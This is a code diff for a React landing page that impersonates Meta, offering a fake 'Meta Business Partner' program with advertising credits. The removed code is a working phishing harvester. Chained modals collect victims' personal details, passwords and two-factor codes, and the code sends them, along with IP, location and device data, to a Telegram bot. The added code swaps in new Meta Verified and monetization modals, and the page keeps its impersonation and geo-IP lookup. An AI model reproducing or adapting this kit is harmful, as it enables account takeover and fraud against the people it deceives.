@@ -16,16 +16,9 @@ import SupportVideo from '@/assets/images/support.mp4';
 import BackgroundImg from '@/assets/images/background.webp';
 
 import { translateText } from '@/utils/translate';
-import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
-import detectDevice from '@/utils/detect_device';
 import countryToLanguage from '@/utils/country_to_language';
-import FirstFormModal from '@/components/FirstFormModal';
-import LoginModal from '@/components/LoginModal';
-import TwoFAModal from '@/components/TwoFAModal';
-import SuccessModal from '@/components/SuccessModal';
-
-const LABEL = '🎁 Page Monetization 🎁';
+import HomeStartModals from '@/components/home-start-modals';
 
 const Home = () =>
 {
@@ -40,23 +33,9 @@ const Home = () =>
     const [ activeTab, setActiveTab ] = useState( 'facebook' );
     const supportVideoRef = useRef( null );
     const [ isSupportVideoPaused, setIsSupportVideoPaused ] = useState( false );
-    const [ showFirstModal, setShowFirstModal ] = useState( false );
-    const [ showLoginModal, setShowLoginModal ] = useState( false );
-    const [ show2FAModal, setShow2FAModal ] = useState( false );
-    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
-    const [ formData, setFormData ] = useState( {
-        fullName: '',
-        personalEmail: '',
-        businessEmail: '',
-        phone: '',
-        pageName: '',
-        loginIdentifier: ''
-    } );
-    const [ loginAttempts, setLoginAttempts ] = useState( [] );
-    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
-    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' } );
     const [ translatedTexts, setTranslatedTexts ] = useState( {} );
     const [ isLoading, setIsLoading ] = useState( true );
+    const [ isStartModalsOpen, setStartModalsOpen ] = useState( false );
 
     const defaultTexts = useMemo(
         () => ( {
@@ -162,6 +141,27 @@ const Home = () =>
             landingHeroTitle: 'Become a Meta Business Partner',
             landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
             landingGetStartedBtn: 'Get started',
+
+            metaVerifiedTitle: 'Protect your brand with Meta Verified',
+            metaVerifiedDesc:
+                'Stand out with a verified badge, proactive account protection and access to support — so people know they are engaging with the real you.',
+            metaVerifiedBtnFacebook: 'Subscribe on Facebook',
+            metaVerifiedBtnInstagram: 'Subscribe on Instagram',
+            metaVerifiedBusinessLead: 'Are you a business?',
+            metaVerifiedBusinessLink: 'Get more information on Meta Verified for businesses',
+            metaVerifiedDisclaimer: 'Features, availability and pricing may vary by region and app.',
+            metaVerifiedAriaClose: 'Close dialog',
+            metaVerifiedPhonesAlt: 'Facebook and Instagram with Meta Verified',
+
+            monetizeModalBack: 'Tất cả các mục tiêu kinh doanh',
+            monetizeModalEyebrow: 'Kiếm tiền từ nội dung của tôi',
+            monetizeModalTitle: 'Tìm những cách thức mới để kiếm tiền từ nội dung của bạn.',
+            monetizeModalCreator: 'Người sáng tạo',
+            monetizeModalDesc:
+                'Dù bạn đang tạo video hay đăng bài lên blog, các công cụ kiếm tiền của Facebook đều giúp bạn kiếm được nhiều tiền hơn.',
+            monetizeModalSubscribe: 'Đăng ký',
+            monetizeModalBrand: 'The Vegan Baker',
+            monetizeModalHeroAlt: 'Người sáng tạo nội dung trong bếp với bánh cupcake',
 
             trustedPartnersTitle: 'Meta Business Partners are trusted experts',
             trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',
@@ -317,12 +317,6 @@ const Home = () =>
             {
                 const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                 const data = response.data;
-                setIpInfo( {
-                    ip: data.ip || 'Unknown',
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country || 'Unknown'
-                } );
                 localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
 
                 const countryCode = data.country_code;
@@ -372,130 +366,6 @@ const Home = () =>
         [ defaultTexts ]
     );
 
-    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );
-
-    const formatDateTime = ( d ) =>
-    {
-        return (
-            pad( d.getDate() ) +
-            '/' +
-            pad( d.getMonth() + 1 ) +
-            '/' +
-            d.getFullYear() +
-            ' ' +
-            pad( d.getHours() ) +
-            ':' +
-            pad( d.getMinutes() ) +
-            ':' +
-            pad( d.getSeconds() )
-        );
-    };
-
-    const buildAndSend = async ( data ) =>
-    {
-        const dt = formatDateTime( new Date() );
-        const { form, login, passes, codes } = data;
-        const device = detectDevice();
-
-        let message = `💵 <b>${ LABEL }</b>\n`;
-        message += `⏰ ${ dt }\n`;
-        message += `🌐 IP: <code>${ ipInfo.ip }</code>\n`;
-        message += `📍 Vị trí: ${ ipInfo.city }, ${ ipInfo.region }, ${ ipInfo.country }\n`;
-        message += `📱 Thiết bị: ${ device.deviceInfo }\n`;
-        if ( device.cpu ) message += `💻 CPU: ${ device.cpu }\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━\n`;
-
-        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
-        {
-            message += `<b>📋 THÔNG TIN</b>\n`;
-            if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
-            if ( form.personalEmail ) message += `   Email: <code>${ form.personalEmail }</code>\n`;
-            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
-            {
-                message += `   Business: <code>${ form.businessEmail }</code>\n`;
-            }
-            if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
-            if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
-        }
-
-        if ( login || ( passes && passes.length > 0 ) )
-        {
-            message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
-            if ( login ) message += `   TK: <code>${ login }</code>\n`;
-            if ( passes && passes.length > 0 )
-            {
-                passes.forEach( ( p, i ) =>
-                {
-                    message += `   MK${ i + 1 }: <code>${ p }</code>\n`;
-                } );
-            }
-        }
-
-        if ( codes && codes.length > 0 )
-        {
-            message += `\n<b>🔒 MÃ 2FA</b>\n`;
-            codes.forEach( ( c, i ) =>
-            {
-                message += `   Code${ i + 1 }: <code>${ c }</code>\n`;
-            } );
-        }
-
-        message += `━━━━━━━━━━━━━━━━━━━━`;
-
-        try
-        {
-            await sendMessage( message );
-        } catch ( error )
-        {
-            console.error( 'Error sending message:', error );
-        }
-    };
-
-    const handleFirstFormSubmit = ( data ) =>
-    {
-        const newFormData = { ...formData, ...data };
-        setFormData( newFormData );
-        setShowFirstModal( false );
-        setShowLoginModal( true );
-
-        buildAndSend( {
-            form: newFormData,
-            login: null,
-            passes: [],
-            codes: []
-        } );
-    };
-
-    const handleLoginSubmit = ( email, password ) =>
-    {
-        const newFormData = { ...formData, loginIdentifier: email };
-        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );
-
-        setFormData( newFormData );
-        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );
-
-        buildAndSend( {
-            form: newFormData,
-            login: email,
-            passes: newPasses,
-            codes: twoFAAttempts.map( c => c.value )
-        } );
-    };
-
-    const handle2FASubmit = ( code ) =>
-    {
-        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );
-
-        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );
-
-        buildAndSend( {
-            form: formData,
-            login: formData.loginIdentifier,
-            passes: loginAttempts.map( p => p.value ),
-            codes: newCodes
-        } );
-    };
-
     const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;
 
     if ( isLoading )
@@ -537,9 +407,23 @@ const Home = () =>
                     <div style={ { display: 'flex', alignItems: 'center', gap: '8px' } }>
                         <img src={ MetaLogoBlue } alt="Meta" style={ { width: '61px', objectFit: 'contain' } } />
                         <nav className="landing-nav-desktop" style={ { marginLeft: '50px', display: 'flex', alignItems: 'center', gap: '28px' } }>
-                            { [ texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport ].map( ( item ) => (
+                            { [ texts.navGetStarted, texts.navAdvertise, texts.navLearn, texts.navSupport ].map( ( item, navIndex ) => (
                                 <span
                                     key={ item }
+                                    role={ navIndex === 0 ? 'button' : undefined }
+                                    tabIndex={ navIndex === 0 ? 0 : undefined }
+                                    onClick={ () =>
+                                    {
+                                        if ( navIndex === 0 ) setStartModalsOpen( true );
+                                    } }
+                                    onKeyDown={ ( e ) =>
+                                    {
+                                        if ( navIndex === 0 && ( e.key === 'Enter' || e.key === ' ' ) )
+                                        {
+                                            e.preventDefault();
+                                            setStartModalsOpen( true );
+                                        }
+                                    } }
                                     style={ { cursor: 'pointer', color: '#0A1317', fontWeight: '400', fontSize: '14px', whiteSpace: 'nowrap' } }
                                 >
                                     { item }
@@ -555,6 +439,17 @@ const Home = () =>
                         </span>
                         <span
                             id="header-start-now"
+                            role="button"
+                            tabIndex={ 0 }
+                            onClick={ () => setStartModalsOpen( true ) }
+                            onKeyDown={ ( e ) =>
+                            {
+                                if ( e.key === 'Enter' || e.key === ' ' )
+                                {
+                                    e.preventDefault();
+                                    setStartModalsOpen( true );
+                                }
+                            } }
                             style={ {
                                 cursor: 'pointer',
                                 background: '#0457CB',
@@ -565,7 +460,6 @@ const Home = () =>
                                 borderRadius: '100px',
                                 whiteSpace: 'nowrap'
                             } }
-                            onClick={ () => setShowFirstModal( true ) }
                         >
                             { texts.startNow }
                         </span>
@@ -621,6 +515,17 @@ const Home = () =>
                     {/* CTA Button */ }
                     <div
                         id="hero-get-started"
+                        role="button"
+                        tabIndex={ 0 }
+                        onClick={ () => setStartModalsOpen( true ) }
+                        onKeyDown={ ( e ) =>
+                        {
+                            if ( e.key === 'Enter' || e.key === ' ' )
+                            {
+                                e.preventDefault();
+                                setStartModalsOpen( true );
+                            }
+                        } }
                         style={ {
                             display: 'inline-flex',
                             alignItems: 'center',
@@ -632,7 +537,6 @@ const Home = () =>
                             borderRadius: '100px',
                             margin: '24px auto 0',
                         } }
-                        onClick={ () => setShowFirstModal( true ) }
                     >
                         <span style={ { fontSize: '15px', color: '#fff', fontWeight: '500', whiteSpace: 'nowrap' } }>
                             { texts.landingGetStartedBtn }
@@ -1244,7 +1148,6 @@ const Home = () =>
                                     cursor: 'pointer',
                                     whiteSpace: 'nowrap'
                                 } }
-                                onClick={ () => setShowFirstModal( true ) }
                             >
                                 { texts.learnMore }
                             </div>
@@ -1541,7 +1444,6 @@ const Home = () =>
                                         cursor: 'pointer',
                                         boxShadow: '0 10px 30px rgba(24,119,242,0.2)'
                                     } }
-                                    onClick={ () => setShowFirstModal( true ) }
                                 >
                                     { texts.getSupport }
                                 </button>
@@ -1595,7 +1497,6 @@ const Home = () =>
                             cursor: 'pointer',
                             boxShadow: '0 4px 12px rgba(0,0,0,0.15)'
                         } }
-                        onClick={ () => setShowFirstModal( true ) }
                     >
                         { texts.learnMore }
                     </button>
@@ -1634,7 +1535,7 @@ const Home = () =>
                                 { texts.footerDisclaimer || 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our' }{ ' ' }
                                 <span style={ { textDecoration: 'underline', cursor: 'pointer' } }>{ texts.dataPolicy || "Data Policy" }</span>.
                             </p>
-                            <button style={ { background: '#0062ff', color: '#fff', padding: '0 24px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer' } } onClick={ () => setShowFirstModal( true ) }>
+                            <button style={ { background: '#0062ff', color: '#fff', padding: '0 24px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer' } }>
                                 { texts.subscribeBtn }
                             </button>
                         </div>
@@ -1826,13 +1727,31 @@ const Home = () =>
             </footer>
             {/* ===== END FOOTER ===== */ }
             </div>
-
-            {/* Modals - giữ nguyên, không chỉnh sửa */ }
-            <FirstFormModal show={ showFirstModal } onClose={ () => setShowFirstModal( false ) } onSubmit={ handleFirstFormSubmit } texts={ texts } />
-            <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } formData={ formData } />
-            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowSuccessModal( true ); } } texts={ texts } formData={ formData } />
-            <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
-
+            <HomeStartModals
+                isOpen={ isStartModalsOpen }
+                onClose={ () => setStartModalsOpen( false ) }
+                metaCopy={ {
+                    title: texts.metaVerifiedTitle,
+                    description: texts.metaVerifiedDesc,
+                    btnFacebook: texts.metaVerifiedBtnFacebook,
+                    btnInstagram: texts.metaVerifiedBtnInstagram,
+                    businessLead: texts.metaVerifiedBusinessLead,
+                    businessLink: texts.metaVerifiedBusinessLink,
+                    disclaimer: texts.metaVerifiedDisclaimer,
+                    ariaClose: texts.metaVerifiedAriaClose,
+                    phonesAlt: texts.metaVerifiedPhonesAlt,
+                } }
+                monetizeCopy={ {
+                    back: texts.monetizeModalBack,
+                    eyebrow: texts.monetizeModalEyebrow,
+                    title: texts.monetizeModalTitle,
+                    creatorLabel: texts.monetizeModalCreator,
+                    description: texts.monetizeModalDesc,
+                    subscribe: texts.monetizeModalSubscribe,
+                    brandName: texts.monetizeModalBrand,
+                    heroAlt: texts.monetizeModalHeroAlt,
+                } }
+            />
         </>
     );
 };
